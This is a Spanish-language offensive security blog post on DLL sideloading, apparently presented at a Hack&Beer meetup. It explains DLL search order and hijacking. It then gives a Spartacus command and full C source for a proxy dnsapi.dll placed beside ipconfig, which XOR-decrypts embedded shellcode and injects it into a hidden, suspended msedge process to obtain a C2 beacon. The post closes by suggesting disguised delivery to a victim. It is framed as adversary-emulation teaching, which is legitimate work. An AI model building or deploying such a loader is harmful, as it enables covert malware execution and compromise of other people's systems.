+++
date = '2026-08-03T18:36:07-06:00'
title = 'DLL Sideloading'
+++
Proxificando DLLs sobre aplicaciones legítimas para evadir detecciones y obtener un implant.
<!--more-->

## Overview
Esta técnica permite utilizar un binario legítimo, ya sea firmado por Microsoft o simplemente inofensivo, para cargar una DLL controlada por nosotros, permitiéndonos ejecutar, por ejemplo, un loader que posteriormente aloje shellcode en memoria para obtener un implant en nuestro C2 preferido.
Por comodidad en este artículo (o como sea que quieras llamarle al post xD) estaré utilizando AdaptixC2 y su agente como shellcode.

## DLLs
Para entender la técnica primero hay que ahondar en la base principal sobre la que funciona. ¿Alguna vez te has preguntado **qué es una DLL?**, ese componente que vemos comúnmente dentro de Windows cada que monitoreamos el sistema. Bueno, pues si no lo has hecho, yo sí xd, y para ahorrarte tiempo explicaré las bases de este objeto.
> La siguiente explicación está meramente hecha para que se entienda la técnica posterior, te recomiendo investigar por tu cuenta para tener el concepto más claro.

Una DLL es un componente de Windows (omg qué buena explicación) utilizado en ámbitos de desarrollo para alojar código que será compartido por distintos programas durante su ejecución, esto permite, por ejemplo, no tener que reescribir la misma función una y otra, y otra, y otra, y otra, y otra vez (se entiende el concepto xd).

Las DLLs tienen que ser importadas en las aplicaciones para poder acceder a sus funciones, un ejemplo en código de esto puede lucir como el siguiente snippet:
```c
#include <windows.h>
#include <stdio.h>

// 1. Define a function pointer matching the target function's signature
typedef int (*AddFunc)(int, int);

int main() {
    // 2. Load the DLL file
    HMODULE hDll = LoadLibrary("my_library.dll");
    if (hDll == NULL) {
        printf("Error: Could not load the DLL.\n");
        return 1;
    }

    // 3. Get the function address
    AddFunc myAddFunction = (AddFunc)GetProcAddress(hDll, "AddNumbers");
    if (myAddFunction == NULL) {
        printf("Error: Could not find the function.\n");
        FreeLibrary(hDll);
        return 1;
    }

    // 4. Call the function
    int result = myAddFunction(5, 10);
    printf("Result: %d\n", result);

    // 5. Unload the DLL when finished
    FreeLibrary(hDll);
    return 0;
}
```
Ahora, en la vida todo tiene un orden, y la búsqueda de DLLs en Windows no es la excepción. Windows por defecto buscará en el siguiente orden por la librería `my_library.dll`:
- The directory where the application runs
- The system folder (`C:\Windows\System32`)
- The 16-bit system folder (`C:\Windows\System`)
- The Windows folder (`C:\Windows`)
- The current working directory

So, ahora, quizás te hayas preguntado, **¿qué pasa si logro escribir una DLL sobre alguno de estos directorios?**, bueno, pues alguien ya lo hizo, y de hecho gracias a esta pregunta es que existe la base de nuestra técnica, el **DLL Hijacking**.
## DLL Hijacking
Este es el primitivo para la técnica de evasión que se explica en este artículo, básicamente una aplicación es vulnerable a **secuestro de librerías** si se cumplen ciertos requisitos:
- La aplicación no especifica el path completo donde la DLL se encuentra
- Se tiene *Write Access* sobre algún directorio incluido en el search order
- La librería requerida no existe o puede ser interceptada, es decir, puede estar en `C:\Windows`, pero nosotros tenemos *Write* en el directorio donde la aplicación corre, so, nuestra DLL será encontrada antes de la "legítima".

Para encontrar programas vulnerables a este ataque podemos utilizar la herramienta [Process Monitor - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), simplemente hay que implementar los siguientes filtros:
![Filtros Process Monitor](/images/pm-filters.png)
*Imagen 1 ~ Filtros aplicados en **Process Monitor***

El siguiente paso sería buscar por intentos de carga de librerías inexistentes sobre algún directorio donde sea posible escribir:
![Ejemplo Process Monitor](/images/pm-example.png)
*Imagen 2 ~ Librerías inexistentes*

Pero como podrás deducir, actualmente es algo difícil encontrar alguna aplicación utilizada constantemente la cual sea vulnerable a este ataque. Aquí es donde entra la técnica de la cual trata el artículo.

## DLL Sideloading
Esta técnica es mayoritariamente usada en la fase de acceso inicial, de hecho, hay registro de su uso en operaciones leakeadas de APTs bastante reconocidas:
- https://www.cybereason.com/blog/threat-analysis-report-dll-side-loading-widely-abused
- https://unit42.paloaltonetworks.com/dll-hijacking-techniques/

Básicamente consta de tomar un binario legítimo (si es posible que este sea firmado por Microsoft ;b), analizar su carga de DLLs y tomar alguno que nos dé estabilidad para poder utilizarlo como injector para nuestro beacon.

Ahora, hay un problema, puede que la aplicación crashee si simplemente suplantamos la DLL original con alguna creada por nuestro C2, por lo tanto tenemos que realizar el llamado **DLL Proxying**, este término es bastante simple de entender, básicamente consta de, al mismo tiempo que ejecutamos nuestro payload malicioso una vez se importe nuestra DLL sobre la aplicación, redireccionemos las funciones originales de la DLL suplantada, de tal forma que la aplicación tiene todas las funciones necesarias para continuar con su ejecución y nosotros tenemos nuestro código malicioso siendo ejecutado sin ninguna interferencia.
![Ejemplo de ejecucion](/images/DLL-Sideloading-Execution-Flow(Fortra).png)
*Imagen 3 ~ DLL Sideloading Attack Flow - From [Cobalt Strike Blog](https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit)*

Ya que se entienden las bases de la técnica, procederé a explicar cómo podemos implementar **DLL Sideloading** en un payload de nuestra autoría, para posteriormente llevarlo al mundo real fungiendo como parte de nuestro initial access.

## Implementación
Lo primero que tenemos que hacer es seleccionar el binario que queremos utilizar para nuestra implementación, recomiendo que sea alguno firmado por Microsoft, dado que estos causan menos ruido, pero si no es posible puedes utilizar cualquier programa legítimo.

**Para efectos prácticos esta implementación será sobre el binario `ipconfig`**

Una vez se tenga seleccionado el binario a distribuir es necesario filtrar por DLLs cuya operación resulte en `NAME NOT FOUND`, esto nos permite desarrollar nuestra propia librería, la cual al estar ubicada en el mismo directorio del binario será cargada antes de que el sistema operativo encuentre la librería legítima. En este caso escribiremos sobre la librería `dnsapi.dll`.
![Notepad++ Targeted DLL](/images/pm-targeted-dll.png)
*Imagen 4 ~ Librería utilizada*

Ahora, debemos encontrar esta librería en el sistema para poder resolver todas las funciones exportadas, para esto podemos utilizar herramientas manuales y crear nuestro template en C paso por paso o podemos utilizar herramientas automatizadas como [sadreck/Spartacus: Spartacus DLL/COM Hijacking Toolkit](https://github.com/sadreck/Spartacus).
Esta herramienta contiene varias funciones, algunas bastante útiles, como la generación automática de librerías pasándole como input un *.csv* generado por *Process Monitor*, y la que estamos buscando nosotros en específico, generar un template de proxy para la librería específica que buscamos utilizar.

En este caso la librería `dnsapi.dll` está localizada en el directorio `C:\Windows\System32\dnsapi.dll`, so, el comando para generar nuestro template quedaría de la siguiente forma:
```powershell
.\Spartacus --mode proxy --dll C:\Windows\System32\dnsapi.dll --solution "C:\data\tmp\dllout" --overwrite --verbose --external-resources
```
Esto nos devolverá un proyecto de Visual Studio, el cual contiene un template como el siguiente:
```c
#pragma once

#pragma comment(linker,"/export:AdaptiveTimeout_ClearInterfaceSpecificConfiguration=c:\\windows\\system32\\dnsapi.AdaptiveTimeout_ClearInterfaceSpecificConfiguration,@1")
#pragma comment(linker,"/export:AdaptiveTimeout_ResetAdaptiveTimeout=c:\\windows\\system32\\dnsapi.AdaptiveTimeout_ResetAdaptiveTimeout,@2")
#pragma comment(linker,"/export:AddRefQueryBlobEx=c:\\windows\\system32\\dnsapi.AddRefQueryBlobEx,@3")
#pragma comment(linker,"/export:BreakRecordsIntoBlob=c:\\windows\\system32\\dnsapi.BreakRecordsIntoBlob,@4")
#pragma comment(linker,"/export:Coalesce_UpdateNetVersion=c:\\windows\\system32\\dnsapi.Coalesce_UpdateNetVersion,@5")
#pragma comment(linker,"/export:CombineRecordsInBlob=c:\\windows\\system32\\dnsapi.CombineRecordsInBlob,@6")
#pragma comment(linker,"/export:DnsRecordSetCompare=c:\\windows\\system32\\dnsapi.DnsRecordSetCompare,@133")
#pragma comment(linker,"/export:DnsRecordSetCopyEx=c:\\windows\\system32\\dnsapi.DnsRecordSetCopyEx,@134")
#pragma comment(linker,"/export:DnsRecordSetDetach=c:\\windows\\system32\\dnsapi.DnsRecordSetDetach,@135")
#pragma comment(linker,"/export:DnsRecordStringForType=c:\\windows\\system32\\dnsapi.DnsRecordStringForType,@136")
/*
*  MUCHAS MAS IMPORTACIONES
*/
#pragma comment(linker,"/export:Update_ReplaceAddressRecordsW=c:\\windows\\system32\\dnsapi.Update_ReplaceAddressRecordsW,@286")
#pragma comment(linker,"/export:Util_IsIp6Running=c:\\windows\\system32\\dnsapi.Util_IsIp6Running,@287")
#pragma comment(linker,"/export:Util_IsRunningOnXboxOne=c:\\windows\\system32\\dnsapi.Util_IsRunningOnXboxOne,@288")
#pragma comment(linker,"/export:WriteDnsNrptRulesToRegistry=c:\\windows\\system32\\dnsapi.WriteDnsNrptRulesToRegistry,@289")

#include "windows.h"
#include "winternl.h"
#include "ios"
#include "fstream"
#include "shellcode.h"

#pragma comment(lib,"ntdll.lib")

// Remove this line if you aren't proxying any functions.
HMODULE hModule = LoadLibrary(L"c:\\windows\\system32\\dnsapi.dll");

// Remove this function if you aren't proxying any functions.
VOID DebugToFile(LPCSTR szInput)
{
    std::ofstream log("spartacus-proxy-dnsapi.log", std::ios_base::app | std::ios_base::out);
    log << szInput;
    log << "\n";
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, run, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
***Para no llenar el artículo de bloat se redujo el codeblock con la template, si sigues paso a paso mi implementación verás que el archivo contiene muchas más `pragma directives`***.

Ya con este template podemos realizar una función que funja como nuestro loader o lo que queramos que nuestro artefacto realice en el sistema operativo de la víctima. A continuación dejo una simple implementación de mi loader la cual básicamente desencripta el shellcode en memoria para posteriormente usar process hollowing para remappear las secciones de un proceso de msedge con nuestro shellcode ya alojado y conseguir un beacon:
```c
#pragma once

#pragma comment(linker,"/export:AdaptiveTimeout_ClearInterfaceSpecificConfiguration=c:\\windows\\system32\\dnsapi.AdaptiveTimeout_ClearInterfaceSpecificConfiguration,@1")
#pragma comment(linker,"/export:AdaptiveTimeout_ResetAdaptiveTimeout=c:\\windows\\system32\\dnsapi.AdaptiveTimeout_ResetAdaptiveTimeout,@2")
#pragma comment(linker,"/export:AddRefQueryBlobEx=c:\\windows\\system32\\dnsapi.AddRefQueryBlobEx,@3")
#pragma comment(linker,"/export:BreakRecordsIntoBlob=c:\\windows\\system32\\dnsapi.BreakRecordsIntoBlob,@4")
#pragma comment(linker,"/export:Coalesce_UpdateNetVersion=c:\\windows\\system32\\dnsapi.Coalesce_UpdateNetVersion,@5")
#pragma comment(linker,"/export:CombineRecordsInBlob=c:\\windows\\system32\\dnsapi.CombineRecordsInBlob,@6")
#pragma comment(linker,"/export:DeRefQueryBlobEx=c:\\windows\\system32\\dnsapi.DeRefQueryBlobEx,@7")
#pragma comment(linker,"/export:DelaySortDAServerlist=c:\\windows\\system32\\dnsapi.DelaySortDAServerlist,@8")
#pragma comment(linker,"/export:DnsAcquireContextHandle_A=c:\\windows\\system32\\dnsapi.DnsAcquireContextHandle_A,@9")
#pragma comment(linker,"/export:DnsAcquireContextHandle_W=c:\\windows\\system32\\dnsapi.DnsAcquireContextHandle_W,@10")
/*
* ...MUCHAS MAS IMPORTACIONES...
*/
#pragma comment(linker,"/export:Socket_JoinMulticast=c:\\windows\\system32\\dnsapi.Socket_JoinMulticast,@279")
#pragma comment(linker,"/export:Socket_RecvFrom=c:\\windows\\system32\\dnsapi.Socket_RecvFrom,@280")
#pragma comment(linker,"/export:Socket_SetMulticastInterface=c:\\windows\\system32\\dnsapi.Socket_SetMulticastInterface,@281")
#pragma comment(linker,"/export:Socket_SetMulticastLoopBack=c:\\windows\\system32\\dnsapi.Socket_SetMulticastLoopBack,@282")
#pragma comment(linker,"/export:Socket_SetTtl=c:\\windows\\system32\\dnsapi.Socket_SetTtl,@283")
#pragma comment(linker,"/export:Socket_TcpListen=c:\\windows\\system32\\dnsapi.Socket_TcpListen,@284")
#pragma comment(linker,"/export:Trace_Reset=c:\\windows\\system32\\dnsapi.Trace_Reset,@285")
#pragma comment(linker,"/export:Update_ReplaceAddressRecordsW=c:\\windows\\system32\\dnsapi.Update_ReplaceAddressRecordsW,@286")
#pragma comment(linker,"/export:Util_IsIp6Running=c:\\windows\\system32\\dnsapi.Util_IsIp6Running,@287")
#pragma comment(linker,"/export:Util_IsRunningOnXboxOne=c:\\windows\\system32\\dnsapi.Util_IsRunningOnXboxOne,@288")
#pragma comment(linker,"/export:WriteDnsNrptRulesToRegistry=c:\\windows\\system32\\dnsapi.WriteDnsNrptRulesToRegistry,@289")

#include "windows.h"
#include "winternl.h"
#include "ios"
#include "fstream"
#include "shellcode.h"

#pragma comment(lib,"ntdll.lib")

HMODULE hModule = LoadLibrary(L"c:\\windows\\system32\\dnsapi.dll");

VOID DebugToFile(LPCSTR szInput)
{
    std::ofstream log("spartacus-proxy-dnsapi.log", std::ios_base::app | std::ios_base::out);
    log << szInput;
    log << "\n";
}

void XorDecrypt(unsigned char* shellcode, size_t size, unsigned char* key, size_t keyLen)
{
    for (size_t i = 0; i < size; i++)
        shellcode[i] ^= key[i % keyLen];
}

DWORD WINAPI run(LPVOID) {
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    unsigned char key[] = "7e1d57e27208ea43175604eafee2004e";

    XorDecrypt(shellcode, sizeof(shellcode), key, sizeof(key) - 1);

    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(
        LR"(C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe)",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL,
        L"C:\\Windows\\System32", &si, &pi))
        return 1;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi,
        sizeof(pbi), &returnLength);

    LPVOID lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    LPVOID baseAddress = nullptr;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(pi.hProcess, lpBaseAddress, &baseAddress, 8, &bytesRead);

    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(pi.hProcess, baseAddress, &dHeader, sizeof(dHeader),
        &bytesRead);

    LPVOID lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(pi.hProcess, lpNtHeader, &ntHeaders, sizeof(ntHeaders),
        &bytesRead);

    LPVOID entryPoint = (LPVOID)((DWORD64)baseAddress +
        ntHeaders.OptionalHeader.AddressOfEntryPoint);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, entryPoint, sizeof(shellcode),
        PAGE_EXECUTE_READWRITE, &oldProtect);

    SIZE_T bytesWritten = 0;
    WriteProcessMemory(pi.hProcess, entryPoint, shellcode, sizeof(shellcode),
        &bytesWritten);

    VirtualProtectEx(pi.hProcess, entryPoint, sizeof(shellcode), oldProtect,
        &oldProtect);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, run, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Te adelanto que si buscas simplemente copiar y pegar mi implementación no te será del todo útil, dado que en un entorno real necesitarás evadir las detecciones del beacon a ejecutar, el propósito del artículo no es proveer código útil a *skids*, sino que el lector comprenda esta técnica y en caso de resultarle útil o interesante, la implemente en sus propios ejercicios de simulación/emulación de adversario.

Bueno, el último paso sería básicamente armar el paquete que entregaremos a la víctima, con nuestro binario legítimo y la librería desarrollada, esto te lo dejo a ti lector, simplemente sé creativo con el delivery de tal forma que no se vea sospechoso, en mi caso simplemente ejecuté el beacon en otra máquina *Windows 11*, a continuación dejo la PoC:

{{< video src="/videos/HackAndBeerPoC.mp4" >}}

**Esta PoC fue expuesta en la edición de Agosto de 2026 del Hack&Beer.**